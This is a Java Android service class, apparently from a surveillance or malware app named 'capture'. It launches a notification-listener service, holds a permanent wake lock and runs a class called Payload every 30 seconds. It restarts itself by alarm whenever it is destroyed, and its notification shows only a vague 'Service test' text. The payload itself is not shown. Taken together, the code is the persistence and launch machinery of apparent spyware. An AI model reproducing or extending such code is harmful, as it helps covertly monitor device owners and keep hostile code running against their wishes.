package com.capture;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;


public class RealService extends Service {
    private Thread mainThread;
    public static Intent serviceIntent = null;
    ScheduledFuture<?> beeperHandle;
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    private PowerManager.WakeLock wakeLock;

    public RealService() {
    }

    @Override
    
	public int onStartCommand(Intent intent, int flags, int startId) {
		serviceIntent = intent;
		
		startNotificationListenerService();
		acquireWakeLock();

	
		startPayload();
		periodicallyAttempt(); 

		return START_STICKY;
	}
	
	private void startNotificationListenerService() {
        Intent intent = new Intent(this, NotificationListener.class);
        startService(intent);
    }

    public void periodicallyAttempt() {
        long half_an_hour = (60) / (2);

        final Runnable beeper = new Runnable() {
            public void run() {
				
                Payload.start(getApplicationContext());
            }
        };

        beeperHandle = scheduler.scheduleAtFixedRate(beeper, half_an_hour, half_an_hour, TimeUnit.SECONDS);
    }

    private void startPayload() {
		startForeground(1, createNotification());
        Payload.start(getApplicationContext());
    }

    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RealService::WakeLock");
            wakeLock.acquire();
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            wakeLock = null;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWakeLock();

        serviceIntent = null;
        setAlarmTimer();
        Thread.currentThread().interrupt();

        if (mainThread != null) {
            mainThread.interrupt();
            mainThread = null;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public boolean onUnbind(Intent intent) {
        return super.onUnbind(intent);
    }

    protected void setAlarmTimer() {
        final Calendar c = Calendar.getInstance();
        c.setTimeInMillis(System.currentTimeMillis());
        c.add(Calendar.SECOND, 1);
        Intent intent = new Intent(this, AlarmRecever.class);
        PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, 0);

        AlarmManager mAlarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        mAlarmManager.set(AlarmManager.RTC_WAKEUP, c.getTimeInMillis(), sender);
    }

    private void showToast(final Application application, final String msg) {
        Handler h = new Handler(application.getMainLooper());
        h.post(new Runnable() {
				@Override
				public void run() {
					Toast.makeText(application, msg, Toast.LENGTH_LONG).show();
				}
			});
    }

    private Notification createNotification() {
        String channelId = "default_channel_id";
        Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);

        Notification.Builder notificationBuilder;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Channel human readable title", NotificationManager.IMPORTANCE_DEFAULT);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);

            notificationBuilder = new Notification.Builder(this, channelId)
				.setContentTitle("Service test")
				.setContentText("Service is running in the foreground")
				.setSmallIcon(R.drawable.ic_launcher)
				.setAutoCancel(true)
				.setSound(defaultSoundUri)
				.setPriority(Notification.PRIORITY_HIGH);
        } else {
            notificationBuilder = new Notification.Builder(this)
				.setContentTitle("Service test")
				.setContentText("Service is running in the foreground")
				.setSmallIcon(R.drawable.ic_launcher)
				.setAutoCancel(true)
				.setSound(defaultSoundUri)
				.setPriority(Notification.PRIORITY_HIGH);
        }

        return notificationBuilder.build();
    }
}

